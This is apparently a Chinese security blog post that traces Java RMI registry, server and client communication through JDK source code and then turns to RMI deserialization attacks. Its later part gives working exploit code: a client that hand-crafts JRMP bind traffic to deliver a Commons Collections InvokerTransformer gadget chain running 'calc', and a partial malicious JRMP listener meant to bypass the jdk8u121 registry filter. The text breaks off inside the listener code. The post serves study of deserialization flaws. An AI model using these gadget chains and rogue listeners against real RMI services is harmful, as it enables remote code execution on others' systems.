# RMI 工作原理及反序列化知识

## **前言**

把 ```RMI``` 通信过程 ```debug``` 了一下，简单记录一下。

准备环境：```Jdk7u21```、```Jdk8u121```、```IDEA Java```


## **RMI 服务搭建**

```RMI``` 的本质是通过 ```socket``` 编程、```Java``` 序列化和反序列化、动态代理等实现的。

```RMI``` 涉及注册中心、服务端和客户端。搭建一个 ```RMI``` 服务测试一下：

1、创建远程方法接口

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IService extends Remote {
    public String queryName(String no) throws RemoteException;
}

```

2、创建远程方法接口实现类

```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class ServiceImpl extends UnicastRemoteObject implements IService {

    public ServiceImpl() throws RemoteException {
    }

    @Override
    public String queryName(String no) throws RemoteException {
        //方法的具体实现
        System.out.println("hello "+ no);
        return String.valueOf(System.currentTimeMillis());
    }
}
```

3、创建注册中心，启动 ```RMI``` 的注册服务

```java
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class register {
    public static void main(String[] args) {
        Registry registry = null;
        try {
            registry = LocateRegistry.createRegistry(1099);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
        while (true);
    }
}
```

4、服务端

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Created by haby0
 */
public class Server {
    public static void main(String[] args) {
        Registry registry = null;
        try {
            registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            ServiceImpl service = new ServiceImpl();
            registry.bind("vince",service);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```


5、客户端

```java

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    public static void main(String[] args) {
        Registry registry = null;
        try {
            registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            IService service = (IService) registry.lookup("vince");
            String result = service.queryName("jack");
            System.out.println("result from remote : "+result);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (NotBoundException e) {
            e.printStackTrace();
        }
    }
}
```

首先启动注册服务，然后执行服务端，最后执行客户端。可以发现客户端能够成功调用服务端上的方法，实现远程方法调用。


## **通信分析**

1、启动注册服务

```java
LocateRegistry.createRegistry(1099);
```

主要涉及类：

```java
\java\rmi\registry\LocateRegistry.java
\sun\rmi\registry\RegistryImpl.class // 根据端口生成 LiveRef、UnicastServerRef 对象，并调用 setup 方法
\sun\rmi\server\UnicastServerRef.class // 存储封装的 LiveRef 对象,创建 Skeleton 对象
\sun\rmi\server\UnicastRef.class // 存储封装的 LiveRef 对象,远程方法调用时通过此类 invoke 方法调用并获取结果
\sun\rmi\transport\LiveRef.class  // 存储封装的 ObjID 对象和 TCPEndpoint 对象信息
\sun\rmi\transport\tcp\TCPEndpoint.class  // 存储 host、port、csf、ssf 等信息
\sun\rmi\transport\tcp\TCPTransport.class  // ServerSocket 多线程获取连接并处理请求
\sun\rmi\registry\RegistryImpl_Skel.class  // 根据 TCPTransport 连接请求调用 dispatch 方法做相应的处理
\sun\rmi\registry\RegistryImpl_Stub.class  // LocateRegistry.createRegistry(1099); 返回对象，调用 bind、list、lookup 等方法
```

注册服务主要部分是 ```listen``` 方法多线程处理请求部分，所以直接看 ```\sun\rmi\transport\tcp\TCPTransport.class``` 类

```java
private class AcceptLoop implements Runnable {
        private final ServerSocket serverSocket;
        private long lastExceptionTime = 0L;
        private int recentExceptionCount;

        AcceptLoop(ServerSocket var2) {
            this.serverSocket = var2;
        }

        public void run() {
            try {
                this.executeAcceptLoop();
            } finally {
                ...
            }

        }

        private void executeAcceptLoop() {
            ...

            while(true) {
                Socket var1 = null;

                try {
                    var1 = this.serverSocket.accept(); // 从连接队列中取出一个连接请求
                    InetAddress var16 = var1.getInetAddress(); // 获取本地地址
                    String var3 = var16 != null ? var16.getHostAddress() : "0.0.0.0"; // 得到 IP 地址

                    try {
                        TCPTransport.connectionThreadPool.execute(TCPTransport.this.new ConnectionHandler(var1, var3)); // 调用 ConnectionHandler 类的 run0 方法对请求做处理
                    } catch (RejectedExecutionException var11) {
                        ...
                    }
                } catch (Throwable var15) {
                    ...
                }
            }
        }
    }
```

2、服务端

分为两步

第一步，调用 ```LocateRegistry``` 类的 ```getRegistry``` 方法获取代理对象，最终得到 ```RegistryImpl_Stub``` 对象。

```java
LocateRegistry.getRegistry("127.0.0.1",1099);

// 调用 LocateRegistry 类的 getRegistry 方法
public static Registry getRegistry(String host, int port)
        throws RemoteException
{		
        return getRegistry(host, port, null); // 调用本类 getRegistry 方法
}

public static Registry getRegistry(String host, int port,
                                   RMIClientSocketFactory csf)
    throws RemoteException
{
    Registry registry = null;

    if (port <= 0)
        port = Registry.REGISTRY_PORT; // 当 port 小于等于 0 时，使用默认的 1099 端口为 port 值

    if (host == null || host.length() == 0) { // 当 host 为 null 或长度为 0 时，获取本地地址作为 host 值
      
        try {
            host = java.net.InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            host = "";
        }
    }

    LiveRef liveRef =
        new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                    new TCPEndpoint(host, port, csf, null),
                    false); // 创建 TCPEndpoint、ObjID、LiveRef 对象
    RemoteRef ref =
        (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef); // csf 为 null 时创建 UnicastRef 对象，否则创建 UnicastRef2 对象

    return (Registry) Util.createProxy(RegistryImpl.class, ref, false); // 使用工具类创建代理对象，最终得到的是一个 RegistryImpl_Stub 对象，ref 字段值为 上一步的 ref 对象
}
```


第二步，调用第一步得到的 ```RegistryImpl_Stub``` 对象的 ```bind``` 方法

```java
public void bind(String var1, Remote var2) throws AccessException, AlreadyBoundException, RemoteException {
    try {
        RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L); // 调用 TCPChannel 类的 createConnection 方法创建 socket 连接和注册服务通信，两端进行通信，调用响应的方法处理。

        try {
            ObjectOutput var4 = var3.getOutputStream();
            var4.writeObject(var1); // 写入 bind 方法的第一个序列化参数值
            var4.writeObject(var2); // 写入 bind 方法的第二个序列化参数值
        } catch (IOException var5) {
            throw new MarshalException("error marshalling arguments", var5);
        }

        super.ref.invoke(var3);
        super.ref.done(var3);
    } 
	...
}


sun.rmi.transport.tcp.TCPChannel.class

private Connection createConnection() throws RemoteException {
    TCPTransport.tcpLog.log(Log.BRIEF, "create connection");
    TCPConnection var1;
    if (!this.usingMultiplexer) {
        Socket var2 = this.ep.newSocket(); // 创建 socket 连接，
        var1 = new TCPConnection(this, var2);

        try {
            DataOutputStream var3 = new DataOutputStream(var1.getOutputStream());
            this.writeTransportHeader(var3); // 首先写入传输的 Header 值，一个 Int 值 1246907721 和一个 Short 值 2
            if (!var1.isReusable()) { // 当 var1 不为 null 并且可向上转换为 RMISocketInfo 对象时，调用 isReusable 方法，获取返回值，否则直接返回 true。  如：当 var1 为 HttpSendSocket 类对象时，会调用 isReusable 方法返回 false
                var3.writeByte(76);
            } else {
                var3.writeByte(75); // 写入 Byte 值 75
                var3.flush(); // 刷新数据流
                int var4 = 0;

                try {
                    var4 = var2.getSoTimeout();
                    var2.setSoTimeout(handshakeTimeout);
                } catch (Exception var15) {
                    ;
                }

                DataInputStream var5 = new DataInputStream(var1.getInputStream());
                byte var6 = var5.readByte(); // 读取一个 Byte 值
                if (var6 != 78) { // 当 Byte 值为 78 时，抛出异常
                    throw new ConnectIOException(var6 == 79 ? "JRMP StreamProtocol not supported by server" : "non-JRMP server at remote endpoint");
                }

                String var7 = var5.readUTF(); // 读取一个 UTF 值，socket 连接本地 ip 地址
                int var8 = var5.readInt(); // 读取一个 Int 值，socket 连接本地 port 端口值
                if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
                    TCPTransport.tcpLog.log(Log.VERBOSE, "server suggested " + var7 + ":" + var8);
                }

                TCPEndpoint.setLocalHost(var7);
                TCPEndpoint var9 = TCPEndpoint.getLocalEndpoint(0, (RMIClientSocketFactory)null, (RMIServerSocketFactory)null);
                var3.writeUTF(var9.getHost()); // 写入远程 host 值
                var3.writeInt(var9.getPort()); // 写入远程 port 值
                if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
                    TCPTransport.tcpLog.log(Log.VERBOSE, "using " + var9.getHost() + ":" + var9.getPort());
                }

                try {
                    var2.setSoTimeout(var4 != 0 ? var4 : responseTimeout);
                } catch (Exception var14) {
                    ;
                }

                var3.flush(); // 刷新数据流
            }
        } catch (IOException var16) {
           ...
        }
    } else {
        ...
    }

    return var1;
}

// 然后 \sun\rmi\server\UnicastRef.class newCall 方法创建 StreamRemoteCall 对象

public StreamRemoteCall(Connection var1, ObjID var2, int var3, long var4) throws RemoteException {
        try {
            this.conn = var1;
            Transport.transportLog.log(Log.VERBOSE, "write remote call header...");
            this.conn.getOutputStream().write(80); // 写入 80 
            this.getOutputStream();
            var2.write(this.out); // 调用 ObjID 和 UID 的 write 方法写入相应的值 
            this.out.writeInt(var3); // 写入 0
            this.out.writeLong(var4); // 写入 4905912898345647071L
        } catch (IOException var7) {
            throw new MarshalException("Error marshaling call header", var7);
        }
    }
```


然后看一下 1 中注册中心 ```ConnectionHandler``` 类的 ```run0``` 方法。对照一下服务端的 ```socket``` 连接通信。

```java
private void run0() {
    TCPEndpoint var1 = TCPTransport.this.getEndpoint();
    int var2 = var1.getPort();
    TCPTransport.threadConnectionHandler.set(this);

    try {
        this.socket.setTcpNoDelay(true);
    } catch (Exception var31) {
        ;
    }

    try {
        if (TCPTransport.connectionReadTimeout > 0) {
            this.socket.setSoTimeout(TCPTransport.connectionReadTimeout);
        }
    } catch (Exception var30) {
        ;
    }

    try {
        InputStream var3 = this.socket.getInputStream(); // 获取 socket 输入流
        Object var4 = var3.markSupported() ? var3 : new BufferedInputStream(var3); // 判断输入流是否支持
        ((InputStream)var4).mark(4);
        DataInputStream var5 = new DataInputStream((InputStream)var4);
        int var6 = var5.readInt(); // 获取一个 Int 值，由服务端 socket 通信知道，值为 1246907721
        if (var6 == 1347375956) {
            TCPTransport.tcpLog.log(Log.BRIEF, "decoding HTTP-wrapped call");
            ((InputStream)var4).reset();

            try {
                this.socket = new HttpReceiveSocket(this.socket, (InputStream)var4, (OutputStream)null);
                this.remoteHost = "0.0.0.0";
                var3 = this.socket.getInputStream();
                var4 = new BufferedInputStream(var3);
                var5 = new DataInputStream((InputStream)var4);
                var6 = var5.readInt();
            } catch (IOException var29) {
                throw new RemoteException("Error HTTP-unwrapping call", var29);
            }
        }

        short var7 = var5.readShort(); // 获取一个 Short 值，由服务端 socket 通信知道，值为 2
        if (var6 == 1246907721 && var7 == 2) {
            OutputStream var8 = this.socket.getOutputStream(); // 获取 socket 的输出流
            BufferedOutputStream var9 = new BufferedOutputStream(var8);
            DataOutputStream var10 = new DataOutputStream(var9);
            int var11 = this.socket.getPort();
            if (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) {
                TCPTransport.tcpLog.log(Log.BRIEF, "accepted socket from [" + this.remoteHost + ":" + var11 + "]");
            }

            byte var15 = var5.readByte(); // 获取一个 Byte 值，由服务端 socket 通信知道，值为 75
            TCPEndpoint var12;
            TCPChannel var13;
            TCPConnection var14;
            switch(var15) {
            case 75:
                var10.writeByte(78); // socket 输出流中写入一个 Byte 值 78。（服务端获取值为 78，所以不会抛出异常）
                if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
                    TCPTransport.tcpLog.log(Log.VERBOSE, "(port " + var2 + ") " + "suggesting " + this.remoteHost + ":" + var11);
                }

                var10.writeUTF(this.remoteHost); // socket 输出流中写入远程 host 值
                var10.writeInt(var11); // socket 输出流中写入远程 post 值
                var10.flush();
                String var16 = var5.readUTF(); // 获取一个 UTF 值
                int var17 = var5.readInt(); // 获取一个 Int 值
                if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
                    TCPTransport.tcpLog.log(Log.VERBOSE, "(port " + var2 + ") client using " + var16 + ":" + var17);
                }

                var12 = new TCPEndpoint(this.remoteHost, this.socket.getLocalPort(), var1.getClientSocketFactory(), var1.getServerSocketFactory());
                var13 = new TCPChannel(TCPTransport.this, var12);
                var14 = new TCPConnection(var13, this.socket, (InputStream)var4, var9);
                TCPTransport.this.handleMessages(var14, true); // 调用 TCPTransport 类的 handleMessages 方法继续做处理
                return;
            ...
            }
        }

        TCPTransport.closeSocket(this.socket);
    } catch (IOException var32) {
        TCPTransport.tcpLog.log(Log.BRIEF, "terminated with exception:", var32);
        return;
    } finally {
        TCPTransport.closeSocket(this.socket);
    }

}


void handleMessages(Connection var1, boolean var2) {
	int var3 = this.getEndpoint().getPort();
	
	try {
	    DataInputStream var4 = new DataInputStream(var1.getInputStream());
	
	    do {
	        int var5 = var4.read(); // 获取一个值，由服务端知道值为 80 
	        if (var5 == -1) {
	            if (tcpLog.isLoggable(Log.BRIEF)) {
	                tcpLog.log(Log.BRIEF, "(port " + var3 + ") connection closed");
	            }
	
	            return;
	        }
	
	        if (tcpLog.isLoggable(Log.BRIEF)) {
	            tcpLog.log(Log.BRIEF, "(port " + var3 + ") op = " + var5);
	        }
	
	        switch(var5) {
	        case 80:
	            StreamRemoteCall var6 = new StreamRemoteCall(var1); // 创建 StreamRemoteCall 对象
	            if (!this.serviceCall(var6)) { // 调用本类 serviceCall 方法，大致为读取数据创建 ObjID 对象，然后获取 dispatcher，调用对应类的 dispatch 方法（dispatcher 类为 sun.rmi.registry.RegistryImpl_Skel）
	                return;
	            }
	            break;
	        ...
	        }
	    } while(var2);
	
	} catch (IOException var17) {
	    if (tcpLog.isLoggable(Log.BRIEF)) {
	        tcpLog.log(Log.BRIEF, "(port " + var3 + ") exception: ", var17);
	    }
	
	} finally {
	    try {
	        var1.close();
	    } catch (IOException var16) {
	        ;
	    }
	
	}


public boolean serviceCall(final RemoteCall var1) {
    try {
        ObjID var40;
        try {
            var40 = ObjID.read(var1.getInputStream()); // 获取输入，创建 ObjID 对象
        } catch (IOException var34) {
            throw new MarshalException("unable to read objID", var34);
        }

        Transport var41 = var40.equals(dgcID) ? null : this;
        Target var5 = ObjectTable.getTarget(new ObjectEndpoint(var40, var41));
        final Remote var38;
        if (var5 != null && (var38 = var5.getImpl()) != null) {
            final Dispatcher var6 = var5.getDispatcher();
            var5.incrementCallCount();

            boolean var8;
            try {
                transportLog.log(Log.VERBOSE, "call dispatcher");
                final AccessControlContext var7 = var5.getAccessControlContext();
                ClassLoader var42 = var5.getContextClassLoader();
                Thread var9 = Thread.currentThread();
                ClassLoader var10 = var9.getContextClassLoader();

                try {
                    var9.setContextClassLoader(var42);
                    currentTransport.set(this);

                    try {
                        AccessController.doPrivileged(new PrivilegedExceptionAction<Void>() {
                            public Void run() throws IOException {
                                Transport.this.checkAcceptPermission(var7);
                                var6.dispatch(var38, var1); // 调用 \sun\rmi\server\UnicastServerRef.class 类的 dispatch 方法,最终调用 sun.rmi.registry.RegistryImpl_Skel 类的 dispatch 方法
                                return null;
                            }
                        }, var7);
                        return true;
                    } catch (PrivilegedActionException var32) {
                        throw (IOException)var32.getException();
                    }
                } 
        ...
    }

    return true;
}

sun.rmi.registry.RegistryImpl_Skel.class

public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
        if (var4 != 4905912898345647071L) {
            throw new SkeletonMismatchException("interface hash mismatch");
        } else {
            RegistryImpl var6 = (RegistryImpl)var1;
            String var7;
            Remote var8;
            ObjectInput var10;
            ObjectInput var11;
            switch(var3) {
            case 0: // 服务端、客户端调用 bind 方法
                try {
                    var11 = var2.getInputStream();
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var94) {
                    throw new UnmarshalException("error unmarshalling arguments", var94);
                } catch (ClassNotFoundException var95) {
                    throw new UnmarshalException("error unmarshalling arguments", var95);
                } finally {
                    var2.releaseInputStream();
                }

                var6.bind(var7, var8); // 调用 RegistryImpl 类的 bind 方法为 bindings 字段赋值，会被写入到 WeakRef 中

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var93) {
                    throw new MarshalException("error marshalling return", var93);
                }
            case 1: // 服务端、客户端调用 list 方法
                var2.releaseInputStream();
                String[] var97 = var6.list();

                try {
                    ObjectOutput var98 = var2.getResultStream(true);
                    var98.writeObject(var97);
                    break;
                } catch (IOException var92) {
                    throw new MarshalException("error marshalling return", var92);
                }
            case 2: // 服务端、客户端调用 lookup 方法
                try {
                    var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var89) {
                    throw new UnmarshalException("error unmarshalling arguments", var89);
                } catch (ClassNotFoundException var90) {
                    throw new UnmarshalException("error unmarshalling arguments", var90);
                } finally {
                    var2.releaseInputStream();
                }

                var8 = var6.lookup(var7);

                try {
                    ObjectOutput var9 = var2.getResultStream(true);
                    var9.writeObject(var8);
                    break;
                } catch (IOException var88) {
                    throw new MarshalException("error marshalling return", var88);
                }
            case 3: // 服务端、客户端调用 rebind 方法
                try {
                    var11 = var2.getInputStream();
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var85) {
                    throw new UnmarshalException("error unmarshalling arguments", var85);
                } catch (ClassNotFoundException var86) {
                    throw new UnmarshalException("error unmarshalling arguments", var86);
                } finally {
                    var2.releaseInputStream();
                }

                var6.rebind(var7, var8);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var84) {
                    throw new MarshalException("error marshalling return", var84);
                }
            case 4: // 服务端、客户端调用 unbind 方法
                try {
                    var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var81) {
                    throw new UnmarshalException("error unmarshalling arguments", var81);
                } catch (ClassNotFoundException var82) {
                    throw new UnmarshalException("error unmarshalling arguments", var82);
                } finally {
                    var2.releaseInputStream();
                }

                var6.unbind(var7);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var80) {
                    throw new MarshalException("error marshalling return", var80);
                }
            default:
                throw new UnmarshalException("invalid method number");
            }

        }
    }
```
 
通过注册中心和服务端的通信可以看到：1、服务端往 ```socket``` 中写入序列化数据时，注册中心对用 ```case``` 一定会做反序列化处理；2、注册中心往 ```socket``` 中写入序列化数据时，服务端也一定会做反序列化处理；得出两个结论：1、我们可以通过不同的方法构造自己的 ```socket``` 通信；2、如果注册中心为靶机服务，服务端为攻击端，使用原生的 ```RMI``` 通信会有反被打的可能。



3、客户端

由 2 分析知道，客户端调用 ```lookup``` 方法时，注册中心会调用 ```RegistryImpl_Skel``` 类 ```dispatch``` 方法的 ```case``` 2 做处理。

```java
// RegistryImpl_Skel 类的 dispatch 方法

case 2:
    try {
        var10 = var2.getInputStream();
        var7 = (String)var10.readObject(); // 得到客户端调用 lookup 方法传入的参数值 "vince"
    } catch (IOException var89) {
        throw new UnmarshalException("error unmarshalling arguments", var89);
    } catch (ClassNotFoundException var90) {
        throw new UnmarshalException("error unmarshalling arguments", var90);
    } finally {
        var2.releaseInputStream();
    }

    var8 = var6.lookup(var7); // 返回一个代理对象（调用 RegistryImpl 类的 lookup 方法从 bindings 字段获取 key 为 var7 的 value 值）

    try {
        ObjectOutput var9 = var2.getResultStream(true);
        var9.writeObject(var8); // 数据流中写入代理对象
        break;
    } catch (IOException var88) {
        throw new MarshalException("error marshalling return", var88);
    }
```

客户端通过 ```lookup``` 方法返回的代理对象调用远程方法

```java
IService service = (IService) registry.lookup("vince"); // 代理对象
String result = service.queryName("jack"); // 实际调用 RemoteObjectInvocationHandler 类的 invoke 方法
```

然后客户端新建一个 ```socket``` 连接和服务端，客户端写入 Int 值 -1 和 Long 值(method 的 hash 值)，服务端在 ```\sun\rmi\server\UnicastServerRef.class``` 类的 ```dispatch``` 获取 Int 值和 Long 值做处理。

```java
public void dispatch(Remote var1, RemoteCall var2) throws IOException {
    try {
        long var4;
        ObjectInput var40;
        try {
            var40 = var2.getInputStream();
            int var3 = var40.readInt();
            if (var3 >= 0) { // 1、Int 值大于等于 0 时，注册中心处理 bind、lookup 等方法的请求；2、Int值小于 0 时，注册中心处理远程方法调用请求；
                if (this.skel != null) {
                    this.oldDispatch(var1, var2, var3);
                    return;
                }

                throw new UnmarshalException("skeleton class not found but required for client version");
            }

            var4 = var40.readLong();
        } catch (Exception var36) {
            throw new UnmarshalException("error unmarshalling call header", var36);
        }

        MarshalInputStream var39 = (MarshalInputStream)var40;
        var39.skipDefaultResolveClass();
        Method var8 = (Method)this.hashToMethod_Map.get(var4);
        if (var8 == null) {
            throw new UnmarshalException("unrecognized method hash: method not supported by remote object");
        }

        this.logCall(var1, var8);
        Class[] var9 = var8.getParameterTypes();
        Object[] var10 = new Object[var9.length];

        try {
            this.unmarshalCustomCallData(var40);

            for(int var11 = 0; var11 < var9.length; ++var11) {
                var10[var11] = unmarshalValue(var9[var11], var40);
            }
        } catch (IOException var33) {
            throw new UnmarshalException("error unmarshalling arguments", var33);
        } catch (ClassNotFoundException var34) {
            throw new UnmarshalException("error unmarshalling arguments", var34);
        } finally {
            var2.releaseInputStream();
        }

        Object var41;
        try {
            var41 = var8.invoke(var1, var10);
        } catch (InvocationTargetException var32) {
            throw var32.getTargetException();
        }

        try {
            ObjectOutput var12 = var2.getResultStream(true);
            Class var13 = var8.getReturnType();
            if (var13 != Void.TYPE) {
                marshalValue(var13, var41, var12);
            }
        } catch (IOException var31) {
            throw new MarshalException("error marshalling return", var31);
        }
    } catch (Throwable var37) {
        Object var6 = var37;
        this.logCallException(var37);
        ObjectOutput var7 = var2.getResultStream(false);
        if (var37 instanceof Error) {
            var6 = new ServerError("Error occurred in server thread", (Error)var37);
        } else if (var37 instanceof RemoteException) {
            var6 = new ServerException("RemoteException occurred in server thread", (Exception)var37);
        }

        if (suppressStackTraces) {
            clearStackTraces((Throwable)var6);
        }

        var7.writeObject(var6);
    } finally {
        var2.releaseInputStream();
        var2.releaseOutputStream();
    }

}
```

通过对源码阅读，对 ```RMI``` 通信过程有了基本了解。大致流程：服务端调用 ```bind``` 方法会在注册中心注册服务。客户端首先和注册中心通信，通过 ```lookup``` 方法从注册服务（存储在 ```Hashtable``` 中）获取到代理对象，客户端根据代理对象信息和服务端建立新的通信。服务端通过反射执行本地方法将结果返回给客户端。


## **RMI 反序列化**

在源码中可以看到注册中心、服务端、客户端三者之间通信都会涉及序列化传输二进制数据。所以我们可以根据 ```RMI``` 的通信流程构造自己的请求和靶机通信，也能避免被反打的可能。```ysoserial``` 项目中 ```JRMPListener``` 利用模块正是重写了 ```RMI``` 通信的逻辑。

依据上面对 ```bind``` 的流程分析，简单重写了 socket 通信

register 模拟注册中心

```java
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Created by haby0
 */
public class register {
    public static void main(String[] args) {
        Registry registry = null;
        try {
            registry = LocateRegistry.createRegistry(1099);

        } catch (RemoteException e) {
            e.printStackTrace();
        }
        while (true);
    }
}
```



simulationRmi 模拟服务端

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import sun.rmi.server.MarshalOutputStream;
import sun.rmi.server.MarshalInputStream;
import sun.rmi.transport.tcp.TCPChannel;
import sun.rmi.transport.tcp.TCPConnection;
import sun.rmi.transport.tcp.TCPEndpoint;
import sun.rmi.transport.tcp.TCPTransport;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.rmi.Remote;
import java.rmi.server.RMIClassLoader;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by haby0
 */
public class simulationRmi {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("127.0.0.1", 1099);


        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
        dos.writeInt(1246907721);
        dos.writeShort(2);
        dos.writeByte(75);
        dos.flush();
        dos.writeUTF("10.10.10.1");
        dos.writeInt(0);
        dos.flush();
        dos.write(80);

        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());

        oos.writeLong(0);
        oos.writeInt(0);
        oos.writeLong(0);
        oos.writeShort(0);

        oos.writeInt(0);
        oos.writeLong(4905912898345647071L);

        oos.flush();

        MarOutputStream mos = new MarOutputStream(socket.getOutputStream());


        mos.writeObject(generateRemote());

    }

    public static Remote generateRemote() throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
        };

        Transformer transformer = new ChainedTransformer(transformers);

        HashMap hm = new HashMap();

        Map lm = LazyMap.decorate(hm, transformer);


        Constructor constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);

        constructor.setAccessible(true);

        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Target.class, lm);

        Map proxy = (Map) Proxy.newProxyInstance(simulationRmi.class.getClassLoader(), new Class[]{Map.class}, invo);


        constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);

        constructor.setAccessible(true);

        InvocationHandler obj = (InvocationHandler)constructor.newInstance(Target.class, proxy);

        Remote remote = Remote.class.cast(Proxy.newProxyInstance(simulationRmi.class.getClassLoader(), new Class[] {Remote.class}, obj));

        return remote;
    }

}

```


MarOutputStream 对写入的序列化数据做处理（模拟原有的序列化类）

```java
import sun.rmi.transport.ObjectTable;
import sun.rmi.transport.Target;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.rmi.Remote;
import java.rmi.server.RMIClassLoader;
import java.rmi.server.RemoteStub;
import java.security.AccessController;
import java.security.PrivilegedAction;

/**
 * Created by haby0
 */
public class MarOutputStream extends ObjectOutputStream {
    public MarOutputStream(OutputStream var1) throws IOException {
        this(var1, 1);
    }

    public MarOutputStream(OutputStream var1, int var2) throws IOException {
        super(var1);
        this.useProtocolVersion(var2);
        AccessController.doPrivileged(new PrivilegedAction<Void>() {
            public Void run() {
                MarOutputStream.this.enableReplaceObject(true);
                System.out.println("AccessController.doPrivileged");
                return null;
            }
        });
    }

    protected final Object replaceObject(Object var1) throws IOException {
        if (var1 instanceof Remote && !(var1 instanceof RemoteStub)) {
            Target var2 = ObjectTable.getTarget((Remote)var1);
            System.out.println("var2：" + var2);
            if (var2 != null) {
                System.out.println("var2.getStub()：" + var2.getStub());
                return var2.getStub();
            }
        }

        System.out.println("var1 :" + var1);
        return var1;
    }

    protected void annotateClass(Class<?> var1) throws IOException {
        System.out.println("annotateClass" + var1);
        this.writeLocation(RMIClassLoader.getClassAnnotation(var1));
    }

    protected void annotateProxyClass(Class<?> var1) throws IOException {
        System.out.println("annotateProxyClass" + var1);
        this.annotateClass(var1);
    }

    protected void writeLocation(String var1) throws IOException {
        System.out.println("writeLocation" + var1);
        this.writeObject(var1);
    }
}
```

JDK 在 jdk8u121 版本后加入了白名单机制，在对接收的数据反序列化时进行了调用 ```registryFilter``` 方法对反序列化的类做判断，不满足则抛出异常。threedr3am 师傅已经做过分析了，本处不再详细叙述。```ysoserial``` 项目中 ```payloads.JRMPClient``` 模块正是对白名单机制的绕过。利用场景：当目标通过 ```LocateRegistry.createRegistry(1099);``` 创建了注册服务时，首先外网开启一个类似 ```JRMPListener``` 模块的 ```ServerSocket``` 接收和处理请求。然后给目标传输一个 ```payloads.JRMPClient``` 模块的序列化对象，目标通过对 ```RemoteObject``` 的反序列化和刚才外网 ```JRMPListener``` 模块开启的 ```ServerSocket``` 服务建立通信，```JRMPListener``` 模块给目标发送 ```payload``` 即可。

目标 ```register``` 服务

```java
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Created by haby0
 */
public class register {
    public static void main(String[] args) {
        //注册管理器
        Registry registry = null;
        try {
            //创建一个服务注册管理器
            registry = LocateRegistry.createRegistry(1099);

        } catch (RemoteException e) {
            e.printStackTrace();
        }
        while (true);
    }
}
```

外网 ```JRMPListener```

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by haby0
 */
public class JRMPServer {
    public static void main(String[] args) throws Exception {
        ServerSocket ss = new ServerSocket(8899);

        Socket s;

        while (( s = ss.accept() ) != null){

            System.out.println("accept");

            DataInputStream dis = new DataInputStream(s.getInputStream());
            dis.readInt();
            dis.readShort();
            dis.readByte();

            DataOutputStream dos = new DataOutputStream(s.getOutputStream());

            dos.writeByte(78);
            dos.writeUTF("127.0.0.1");
            dos.writeInt(1099);

            dis.readUTF();
            dis.readInt();
            dis.read();

            ObjectInputStream ois = new ObjectInputStream(s.getInputStream());

            ois.readLong();
            ois.readInt();
            ois.readLong();
            ois.readShort();
            ois.readInt();
            ois.readLong();

            dos.writeByte(81);

            ObjectOutputStream oos = new ObjectOutputStream(s.getOutputStream());

            oos.writeByte(2);
            oos.writeInt(0);
            oos.writeLong(0);
            oos.writeShort(0);


